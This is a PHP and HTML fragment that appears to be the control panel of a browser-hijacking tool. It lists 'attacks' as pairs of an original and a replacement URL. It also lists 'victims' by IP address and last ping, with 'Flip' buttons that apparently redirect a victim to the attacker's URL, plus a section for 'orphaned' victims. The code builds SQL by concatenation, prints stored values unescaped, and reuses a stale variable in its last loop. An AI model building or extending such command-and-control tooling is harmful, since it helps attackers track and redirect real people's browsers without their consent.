<p>&nbsp;</p>
<table class="table">
<thead>
<tr>
	<th></th>
	<th>original URL</th>
	<th>new URL</th>
	<th>action</th>
</tr>
</thead>
<tbody>
<!-- our clients -->
<?php
	/* this just gets the data for the table */
	include('prereq.php');
	$db = new MyDB();

	$icons = array( "dashboard", "ok-circle", "", "", "", "", "", "", "", "question-sign" );
	$attacks = $db->query("SELECT * FROM attacks");
	while($attack = $attacks->fetchArray()){
		print "<tr>".
					"<td><span class=\"glyphicon glyphicon-link\"></span></td>".
					"<td>".$attack['orig_url']."</td>".
					"<td>".$attack['new_url']."</td>".
					"<td><button type=\"button\" class=\"btn btn-default\">Flip</button></td>".
					"</tr>";
		print "<tr>".
					"<td>&nbsp;</td>".
					"<td colspan=\"3\">".
					"<table class=\"table table-condensed\">".
					"<thead><tr><th>Status</th><th>IP</th><th>Last seen</th><th>Action</th></tr></thead>";

		$victims = $db->query("SELECT * FROM victims WHERE attack_id = ".$attack['id']);
		while($row = $victims->fetchArray()){
			$now = new DateTime("now");
			$last_ping = $row['last_ping'];
			$timediff = $now->diff(new DateTime("@$last_ping"));
				
			$time_f = $timediff->format("%d d, %h hr, %i min, %s sec");

			print "<tr class=".($row['action'] == 1 ? "danger" : "").">".
						"<td><span class=\"glyphicon glyphicon-".$icons[(int)$row['status']]."\"></span></td>".
						"<td>".$row['ip']."</td>".
						"<td>".$time_f." ago</td>".
						"<td><button class=\"btn btn-success flip-btn btn-sm\" data-id=\"".$row['id']."\" data-flip=\"".$attack['new_url']."\" data-ip=\"".$row['ip']."\">Flip</button></td>".
						"</tr>";
		}
		print "</table></td></tr>";
	}

	// all zombie attacks
	print "<tr>".
				"<td><span class=\"glyphicon glyphicon-link\"></span></td>".
				"<td colspan=\"3\">".
				"Orphaned Victims (original attack removed)".
				"</td>".
				"</tr>";
	print "<tr>".
				"<td>&nbsp;</td>".
				"<td colspan=\"3\">".
				"<table class=\"table table-condensed\">".
				"<thead><tr><th>Status</th><th>IP</th><th>Last seen</th><th>Action</th></tr></thead>";

	$victims = $db->query("SELECT * FROM victims WHERE attack_id = 0");
	while($row = $victims->fetchArray()){
		$now = new DateTime("now");
		$last_ping = $row['last_ping'];
		$timediff = $now->diff(new DateTime("@$last_ping"));
			
		$time_f = $timediff->format("%d d, %h hr, %i min, %s sec");

		print "<tr class=".($row['action'] == 1 ? "danger" : "").">".
					"<td><span class=\"glyphicon glyphicon-".$icons[(int)$row['status']]."\"></span></td>".
					"<td>".$row['ip']."</td>".
					"<td>".$time_f." ago</td>".
					"<td><button class=\"btn btn-success flip-btn btn-sm\" data-id=\"".$row['id']."\" data-flip=\"".$attack['new_url']."\" data-ip=\"".$row['ip']."\">Flip</button></td>".
					"</tr>";
	}
	print "</table></td></tr>";

	$db->close(); unset($db);
?>
</tbody>
</table>
